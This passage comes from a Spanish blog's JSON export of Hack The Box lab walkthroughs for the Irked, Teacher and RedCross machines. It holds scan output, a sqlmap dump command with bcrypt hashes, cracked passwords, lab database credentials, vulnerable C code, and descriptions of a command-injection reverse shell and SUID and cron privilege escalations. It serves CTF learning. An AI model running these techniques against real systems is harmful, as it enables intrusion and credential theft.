20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.117 Host is up (0.081s latency). Not shown: 65205 closed ports, 323 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100024 1 47041/udp status |_ 100024 1 48216/tcp status 6697/tcp open irc UnrealIRCd 8067/tcp open irc UnrealIRCd 48216/tcp open status 1 (RPC #100024) 65534/tcp open irc UnrealIRCd No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.70%E=4%D=4/26%OT=22%CT=1%CU=31533%PV=Y%DS=2%DC=T%G=Y%TM=5CC2690 OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 113/tcp) HOP RTT ADDRESS 1 83.76 ms 10.10.14.1 2 83.73 ms 10.10.10.117 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2041.57 seconds.   HTTP La pagina inicial nos muestra una imagen y una frase acerca de IRC.\nGOBUSTER Escaneo de directorios y archivos.\n1 2 3 4 5  gobuster -u 10.10.10.117 -w /usr/share/wordlists/dirb/common.txt -q -np -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /manual (Status: 301) /server-status (Status: 403)   SHELL - UnrealIRCd Para UnrealIRCd existe un backdoor el cual se puede explotar mediante un exploit existente en metasploit quiza el mensaje de la pagina principal se referia a esta vulnerabilidad, vamos configuramos el exploit.\nExploit Payload Obtenemos una Shell con el exploit\nEn el directorio principal carpeta Documents encontramos un archivo llamado .backup con un mensaje y una frase, el mensaje habla acerca de steg que se puede referir a steganography pero no encontramos ninguna imagen en los directorios, en la pagina principal se encuentra una imagen vamos a utilizarla para extraer informacion que pueda esconder dentro.\n1 2  Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss   Stego - IRKED Utilizamos steghide para extraer la informacion dentro de la imagen con la frase y encontramos una contraseña.\nSHELL - Djmardov Utilizamos la contraseña que encontramos en la imagen en ssh, obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION Buscamos archivos SUID para escalar privilegios\nEncontramos un archivo /usr/bin/viewuser que al ejecutarlo nos envia un error donde /tmp/listusers no existe.\nPara obtener una shell root agregamos una shell inversa al archivo que no existe, damos permisos al archivo y lo ejecutamos.\nObtenemos nuestra shell root y nuestra bandera root.txt.\n","description":"Irked tiene expuesto el puerto de UnrealIRCd el cual tiene un backdoor, lo que nos dio acceso a la maquina. El siguiente usuario lo obtuvimos por medio de un reto de Esteganografia. Escalamos privilegios mediante un fichero el cual ejecutaba un script donde agregamos una shell inversa.","id":152,"section":"posts","tags":["UnrealIRC","metasploit","steganography","steghide","suid"],"title":"Hack The Box - Irked","uri":"https://sckull.github.io/posts/irked/"},{"content":"  Encontramos credenciales en un fichero y con burpsuite obtuvimos el caracter faltante para acceder a Moodle. Explotamos una vulnerabilidad en Moodle lo que nos dio acceso, y que con credenciales de la base de datos de esta plataforma accedimos a un segundo usuario crackeando los Hashes encontrados. Obtuvimos la flag root creando un link simbolico.\n   Nombre Teacher      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.153   Maker Gioo    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.2, 4.9, 6.1, 3.9, 5.1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[7, 6, 7, 3, 4], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos TCP\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  Nmap 7.70 scan initiated Thu Apr 18 22:50:41 2019 as: nmap -sT -A -sV -o nmap.scan 10.10.10.153 Nmap scan report for 10.10.10.153 Host is up (0.31s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Blackhat highschool Device type: WAP Running: Linux 2.4.X OS CPE: cpe:/o:linux:linux_kernel:2.4.20 OS details: Tomato 1.28 (Linux 2.4.20) Network Distance: 2 hops TRACEROUTE (using proto 1/icmp) HOP RTT ADDRESS 1 296.09 ms 10.10.12.1 2 300.57 ms 10.10.10.153 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Apr 18 22:52:41 2019 -- 1 IP address (1 host up) scanned in 120.38 seconds   GOBUSTER 1 2 3 4 5 6 7 8 9 10 11 12 13  gobuster -u http://10.10.10.153 -w /usr/share/wordlists/dirb/common.txt -q -np -x php,html,txt,js -t 15 /css (Status: 301) /fonts (Status: 301) /gallery.html (Status: 200) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /manual (Status: 301) /moodle (Status: 301) /phpmyadmin (Status: 403) /server-status (Status: 403)   HTTP Pagina Principal\n/Moodle Login /phpmyadmin /gallery.html En gallery.html encontramos codigo javascript que imprime un mensaje.\nJunto al codigo hay una imagen, pero no podemos verla.\nDescargamos la imagen con curl y nos muestra un mensaje que contiene la imagen.\nNos dice que debemos de encontrar el caracter faltante para la contraseña Th4C00lTheacha del usuario Giovanni.\nBURPSUITE - Giovanni Password Vamos a utilizar burpsuite para encontrar el caracter faltante de la contraseña, utilizando el login de moodle. Para los caracteres utilizamos /usr/share/wordlists/dirb/stress/alphanum_case_extra.txt.\nEncontramos que el caracter faltante para la contraseña es #.\nMoodle Utilizando las credenciales Giovanni y Th4C00lTheacha# logramos ingresar a Moodle.\nEvil Teacher - Reverse Shell Para nuestra version de moodle encontramos una vulnerabilidad que puede injectar codigo, para ello vamos a crear un Quiz en el curso de Algebra y vamos a agregar una formula de matematica la cual nos va a ayudar a inyectar codigo.\n Evil Teacher: Remote Code Execution  Obtenemos una shell como www-data.\nUSER - Giovanni Revisamos los archivos de configuracion para posibles contraseñas de base de datos y encontramos las credenciales de una base de datos en el archivo de configuracion de moodle.\n1 2 3 4 5 6 7 8 9 10 11 12 13  $CFG-\u0026gt;dbtype = \u0026#39;mariadb\u0026#39;; $CFG-\u0026gt;dblibrary = \u0026#39;native\u0026#39;; $CFG-\u0026gt;dbhost = \u0026#39;localhost\u0026#39;; $CFG-\u0026gt;dbname = \u0026#39;moodle\u0026#39;; $CFG-\u0026gt;dbuser = \u0026#39;root\u0026#39;; $CFG-\u0026gt;dbpass = \u0026#39;Welkom1!\u0026#39;; $CFG-\u0026gt;prefix = \u0026#39;mdl_\u0026#39;; $CFG-\u0026gt;dboptions = array ( \u0026#39;dbpersist\u0026#39; =\u0026gt; 0, \u0026#39;dbport\u0026#39; =\u0026gt; 3306, \u0026#39;dbsocket\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;dbcollation\u0026#39; =\u0026gt; \u0026#39;utf8mb4_unicode_ci\u0026#39;, );   Nos conectamos a la base de datos\n1  mariadb -u root -p\u0026#39;Welkom1!\u0026#39; -D moodle   Encontramos una tabla con usuarios y contraseña.\n1  select username,password from mdl_user;select username,password from mdl_user;   Crackeamos la contraseña de Giovanibak en https://crackstation.net/.\n1  7a860966115182402ed06375cf0a22af =\u0026gt; expelled   Utilizamos la contraseña con el usuario Giovanni y obtenemos nuestra bandera user.txt.\nROOT - flag Utilizamos pspy para ver los cron que se ejecutan y encontramos un archivo que se ejecuta cada minuto y realiza un backup de la carpeta courses en el directorio de Giovanni.\n1 2 3 4 5 6 7  /usr/bin/backup.sh #!/bin/bash cd /home/giovanni/work; tar -czvf tmp/backup_courses.tar.gz courses/*; cd tmp; tar -xf backup_courses.tar.gz; chmod 777 * -R;   Para obtener nuestra bandera root.txt vamos a untilizar un symlink y lo vamos a apuntar hacia el directorio /root/ donde esta nuestra bandera para que el archivo cuando se ejecute comprima lo que esta en /root/ al archivo backup_courses.tar.gz y poder descomprimirlo, para ello vamos a renombrar courses.\nLuego de un minuto se crea el archivo backup_courses.tar.gz lo descomprimimos y obtenemos nuestra bandera root.txt.\n","description":"Encontramos credenciales en un fichero y con burpsuite obtuvimos el caracter faltante para acceder a Moodle. Explotamos una vulnerabilidad en Moodle lo que nos dio acceso, y que con credenciales de la base de datos de esta plataforma accedimos a un segundo usuario crackeando los Hashes encontrados.  Obtuvimos la flag root creando un link simbolico.","id":153,"section":"posts","tags":["moodle","Evil Teacher","cron"],"title":"Hack The Box - Teacher","uri":"https://sckull.github.io/posts/teacher/"},{"content":"  En RedCross realizamos una enumeracion a un subdominos donde encontramos una funcion de la aplicacion web que nos permite crear un acceso temporal por SSH a una shell limitada, dentro de los parametros de esta accion descrita realizamos Command Inyeccion lo que nos dio acceso aun primer usuario. Finalmente tomamos ventaja de una funcionalidad de la aplicacion para agregar un usario y obtener acceso root.\n   Nombre RedCross      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.113   Maker ompamo    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[8.3, 7.8, 6.4, 3.6, 2.2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[8, 8, 8, 2, 2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Al realizar el primer escaneo a la maquina obtuvimos lo siguiente y al parecer tiene un subdominio (intra).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  Nmap 7.70 scan initiated Mon Jan 14 18:47:33 2019 as: nmap -sC -sV -o tcp 10.10.10.113 Nmap scan report for 10.10.10.113 Host is up (0.22s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0) | ssh-hostkey: | 2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA) | 256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA) |_ 256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519) 80/tcp open http Apache httpd 2.4.25 |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Did not follow redirect to https://intra.redcross.htb/ 443/tcp open ssl/http Apache httpd 2.4.25 |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Did not follow redirect to https://intra.redcross.htb/ | ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US | Not valid before: 2018-06-03T19:46:58 |_Not valid after: 2021-02-27T19:46:58 |_ssl-date: TLS randomness does not represent time | tls-alpn: | http/1.1 http/1.1 (1000 Lineas de lo mismo) |_ http/1.1 Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jan 14 19:47:25 2019 -- 1 IP address (1 host up) scanned in 3592.63 seconds   Subdominios Agregamos el subdominio intra a nuestro archivo local /etc/hosts.\n1  10.10.10.113\tredcross.htb intra.redcross.htb   Al visitar intra.redcross.htb nos muestra un login, podemos probar contraseñas comunes o seguir enumerando la pagina, en este caso el usuario:contraseña que encontramos fue: guest:guest.\nGOBUSTER  Realizamos una busqueda de los directorios y archivos (php,html,txt,pdf,doc) que podrian estar en la pagina, utilizamos el parametro \u0026lsquo;-k\u0026rsquo; saltarnos la verificacion de SSL de la pagina (-k Skip SSL certificate verification).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  gobuster -u https://intra.redcross.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -k -np -t 30 -x php,html,txt,pdf,doc ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : https://intra.redcross.htb/ [+] Threads : 30 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : php,html,txt,pdf,doc [+] Timeout : 10s ===================================================== /documentation (Status: 301) /images (Status: 301) /index.php (Status: 302) /index.php (Status: 302) /init.php (Status: 200) /javascript (Status: 301) /pages (Status: 301) =====================================================   Se realizo de la misma manera para el directorio /documentation y nos encontramos con un documento.\n1 2 3 4  gobuster -u https://intra.redcross.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -k -np -t 30 -x php,html,txt,pdf,doc ===================================================== account-signup.pdf =====================================================   Nos dice que si queremos un acceso a la plataforma debemos llenar un formulario en https://intra.redcross.htb/?page=contact con subject \u0026ldquo;credentials\u0026rdquo; y en el cuerpo del formulario la contraseña del usuario que queremos.\nSQLI Nos logueamos con el usuario y contraseña, al analizar los directorios y paginas, encontramos una vulnerabilidad SQLi en: https://intra.redcross.htb/?o=1'-- -\u0026amp;page=app\nUtilizamos burpsuite para capturar el trafico y capturar una solicitud de la SQLi para luego hacer uso de sqlmap con la solicitud, para luego encontrar usuarios y contraseñas, tambien encontramos mensajes de correos electronicos entre los administradores.\n1 2 3 4 5 6 7 8 9 10  GET /?o=1\u0026amp;page=app HTTP/1.1 Host: intra.redcross.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://intra.redcross.htb/?page=app Cookie: PHPSESSID=vo690q6cktgv56j97dabra5bm3; LANG=EN_US; SINCE=1547616286; LIMIT=10; DOMAIN=intra Connection: close Upgrade-Insecure-Requests: 1   SQLMAP 1  sqlmap -r sql.req --batch --level=5 --risk=3 -D redcross -T users --dump   1 2 3 4 5 6 7 8 9 10 11 12  Database: redcross Table: users [5 entries] +----+------+------------------------------+----------+--------------------------------------------------------------+ | id | role | mail | username | password | +----+------+------------------------------+----------+--------------------------------------------------------------+ | 1 | 0 | admin@redcross.htb | admin | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. | | 2 | 1 | penelope@redcross.htb | penelope | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS | | 3 | 1 | charles@redcross.htb | charles | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i | | 4 | 100 | tricia.wanderloo@contoso.com | tricia | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. | | 5 | 1000 | non@available | guest | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi | +----+------+------------------------------+----------+--------------------------------------------------------------+   1 2 3 4 5 6 7 8 9 10 11 12  Database: redcross Table: messages [8 entries] id,body,dest,origin,subject 1,You\u0026#39;re granted with a low privilege access while we\u0026#39;re processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.,5,1,Guest Account Info 2,\u0026#34;Hi Penny, can you check if is there any problem with the order? I\u0026#39;m not receiving it in our EDI platform.\u0026#34;,2,4,Problems with order 02122128 3,\u0026#34;Please could you check the admin webpanel? idk what happens but when I\u0026#39;m checking the messages, alerts popping everywhere!! Maybe a virus?\u0026#34;,3,1,Strange behavior 4,\u0026#34;Hi, Please check now... Should be arrived in your systems. Please confirm me. Regards.\u0026#34;,4,2,Problems with order 02122128 5,\u0026#34;Hey, my chief contacted me complaining about some problem in the admin webapp. I thought that you reinforced security on it... Alerts everywhere!!\u0026#34;,2,3,admin subd webapp problems 6,\u0026#34;Hi, Yes it\u0026#39;s strange because we applied some input filtering on the contact form. Let me check it. I\u0026#39;ll take care of that since now! KR\u0026#34;,3,2,admin subd webapp problems (priority) 7,\u0026#34;Hi, Please stop checking messages from intra platform, it\u0026#39;s possible that there is a vuln on your admin side... \u0026#34;,1,2,STOP checking messages from intra (priority) 8,Sorry but I can\u0026#39;t do that. It\u0026#39;s the only way we have to communicate with partners and we are overloaded. Doesn\u0026#39;t look so bad... besides that what colud happen? Don\u0026#39;t worry but fix it ASAP.,2,1,STOP checking messages from intra (priority)   Con la vulnerabilidad SQLi solo se pudo sacar mensajes y usuarios, no se pudo ir más alla (shell, lectura, escritura de archivos,etc). Intentando crackear las contraseñas con hashcat solo logramos sacar dos pero no sirvieron de mucho:\n1 2  guest:$2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi:guest charles:$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i:cookiemonster   Pero los mensajes nos dan una idea de lo que podriamos hacer, hablan de admin webpanel el cual no pudimos encontrar con gobuster, pero podria ser algo más que un directorio, un subdominio.\n1  10.10.10.113\tredcross.htb intra.redcross.htb admin.redcross.htb webpanel.redcross.htb   Al visitar webpanel.redcross.htb solo nos redirige de nuevo a intra.redcross.htb, pero si visitamos admin.redcross.htb, nos muestra un nuevo panel de administracion.\nIntentamos utilizar los mismos credenciales pero nos muestra un mensaje:\n1  Not enough privileges!   COOKIES Ya que el subdominio intra y admin pertenecen a la misma maquina intentamos utilizar las cookies del subdominio intra en el de admin utilizando Cookie Manager con los cuales pudimos logearnos como usuario guest.\nObservamos dos User Management, Network Access, en la primera opcion podemos borrar y agregar usuarios, y el server nos genera una contraseña que podemos utilizar para logearnos mediante ssh.\nAgregamos un Usuario\nNos devuelve el usuario y contraseña\nNos logeamos con las credenciales al servicio ssh\nCon el usuario que creamos(nemesis) no pudimos hacer mucho, pero encontramos un archivo \u0026lsquo;iptctl.c\u0026rsquo;, el cual restringe o permite el acceso a la maquina, añadiendo una IP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114  /* * Small utility to manage iptables, easily executable from admin.redcross.htb * v0.1 - allow and restrict mode * v0.3 - added check method and interactive mode (still testing!) */ #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;arpa/inet.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#define BUFFSIZE 360  int isValidIpAddress(char *ipAddress) { struct sockaddr_in sa; int result = inet_pton(AF_INET, ipAddress, \u0026amp;(sa.sin_addr)); return result != 0; } int isValidAction(char *action){ int a=0; char value[10]; strncpy(value,action,9); if(strstr(value,\u0026#34;allow\u0026#34;)) a=1; if(strstr(value,\u0026#34;restrict\u0026#34;)) a=2; if(strstr(value,\u0026#34;show\u0026#34;)) a=3; return a; } void cmdAR(char **a, char *action, char *ip){ a[0]=\u0026#34;/sbin/iptables\u0026#34;; a[1]=action; a[2]=\u0026#34;INPUT\u0026#34;; a[3]=\u0026#34;-p\u0026#34;; a[4]=\u0026#34;all\u0026#34;; a[5]=\u0026#34;-s\u0026#34;; a[6]=ip; a[7]=\u0026#34;-j\u0026#34;; a[8]=\u0026#34;ACCEPT\u0026#34;; a[9]=NULL; return; } void cmdShow(char **a){ a[0]=\u0026#34;/sbin/iptables\u0026#34; ; a[1]=\u0026#34;-L\u0026#34;; a[2]=\u0026#34;INPUT\u0026#34;; return; } void interactive(char *ip, char *action, char *name){ char inputAddress[16]; char inputAction[10]; printf(\u0026#34;Entering interactive mode\\n\u0026#34;); printf(\u0026#34;Action(allow|restrict|show): \u0026#34;); fgets(inputAction,BUFFSIZE,stdin); fflush(stdin); printf(\u0026#34;IP address: \u0026#34;); fgets(inputAddress,BUFFSIZE,stdin); fflush(stdin); inputAddress[strlen(inputAddress)-1] = 0; if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){ printf(\u0026#34;Usage: %s allow|restrict|show IP\\n\u0026#34;, name); exit(0); } strcpy(ip, inputAddress); strcpy(action, inputAction); return; } int main(int argc, char *argv[]){ int isAction=0; int isIPAddr=0; pid_t child_pid; char inputAction[10]; char inputAddress[16]; char *args[10]; char buffer[200]; if(argc!=3 \u0026amp;\u0026amp; argc!=2){ printf(\u0026#34;Usage: %s allow|restrict|show IP_ADDR\\n\u0026#34;, argv[0]); exit(0); } if(argc==2){ if(strstr(argv[1],\u0026#34;-i\u0026#34;)) interactive(inputAddress, inputAction, argv[0]); } else{ strcpy(inputAction, argv[1]); strcpy(inputAddress, argv[2]); } isAction=isValidAction(inputAction); isIPAddr=isValidIpAddress(inputAddress); if(!isAction || !isIPAddr){ printf(\u0026#34;Usage: %s allow|restrict|show IP\\n\u0026#34;, argv[0]); exit(0); } puts(\u0026#34;DEBUG: All checks passed... Executing iptables\u0026#34;); if(isAction==1) cmdAR(args,\u0026#34;-A\u0026#34;,inputAddress); if(isAction==2) cmdAR(args,\u0026#34;-D\u0026#34;,inputAddress); if(isAction==3) cmdShow(args); child_pid=fork(); if(child_pid==0){ setuid(0); execvp(args[0],args); exit(0); } else{ if(isAction==1) printf(\u0026#34;Network access granted to %s\\n\u0026#34;,inputAddress); if(isAction==2) printf(\u0026#34;Network access restricted to %s\\n\u0026#34;,inputAddress); if(isAction==3) puts(\u0026#34;ERR: Function not available!\\n\u0026#34;); } }   Este archivo es utilizado en la segunda opcion del panel de administracion en Network Access, al acceder a la segunda opcion nos muestra las ip que fueron agregada a la lista, en la que tambien podemos denegar el acceso a una IP.\nRCE - Reverse SHELL El archivo que encontramos anteriormente fue compilado y probado localmente, el cual nos pide una opcion y una IP a la cual queremos autorizar|restringir|mostrar y al realizar un analisis a las peticiones al servidor con \u0026lsquo;Burpsuite\u0026rsquo; de esta pagina encontramos que podemos realizar una \u0026lsquo;Inyeccion de Comandos\u0026rsquo; mediante la opcion de denegar (\u0026lsquo;deny\u0026rsquo;) una IP y asi obtener una shell inversa con python.\n Command Injection  Your browser does not support the video tag.  DIRECTORIOS PAGINA WEB Ya dentro de la maquina pudimos enumerar y descargar los archivos pertenecientes a la pagina web y su estructura es la siguiente.\nPRIVILEGE ESCALATION Creando un Usuario - ROOT Enumerando los archivos que se manejan en /var/www/html/* los cuales pertenecen a la pagina web de la maquina, encontramos varios usuarios y contraseñas a Bases de Datos.\n1 2 3 4  actions.php \u0026#34;host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B\u0026amp;\u0026#34; \u0026#34;host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa\u0026amp;\u0026#34; \u0026#34;host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw\u0026#34;   1 2  init.php $dbhost=\u0026#39;127.0.0.1\u0026#39;; $dbuser=\u0026#39;dbcross\u0026#39;; $dbpass=\u0026#39;LOSPxnme4f5pH5wp\u0026#39;;$dbname=\u0026#39;redcross\u0026#39;;   Como pudimos observar, en el panel de administracion podemos crear usuarios, los cuales estan en el grupo de asociados y limitados a una sola carpeta /var/jail/. El codigo php que agrega usuarios a la base de datos.\n1 2 3 4 5 6 7 8 9 10  if($action===\u0026#39;adduser\u0026#39;){ $username=$_POST[\u0026#39;username\u0026#39;]; $passw=generateRandomString(); $phash=crypt($passw); $dbconn = pg_connect(\u0026#34;host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B\u0026amp;\u0026#34;); $result = pg_prepare($dbconn, \u0026#34;q1\u0026#34;, \u0026#34;insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, \u0026#39;/var/jail/home\u0026#39;)\u0026#34;); $result = pg_execute($dbconn, \u0026#34;q1\u0026#34;, array($username, $phash)); echo \u0026#34;Provide this credentials to the user:\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; \u0026lt;--!echo \u0026#34;\u0026lt;b\u0026gt;$username : $passw\u0026lt;/b\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;a href=/?page=users\u0026gt;Continue\u0026lt;/a\u0026gt;\u0026#34;;--\u0026gt; }   El action: adduser realiza una conexion a la base de datos unix y con el usuario \u0026lsquo;unixusrmgr\u0026rsquo; y realiza un query para insertar nombre de usuario, contraseña generada aleatoriamente y la encripta en crypt, gid o al grupo de usuarios que existen en la maquina (/etc/group - associates:x:1001:), tambien un directorio especifico para el usuario. Sabiendo esto podemos tomar ventaja de esta funcion y crear 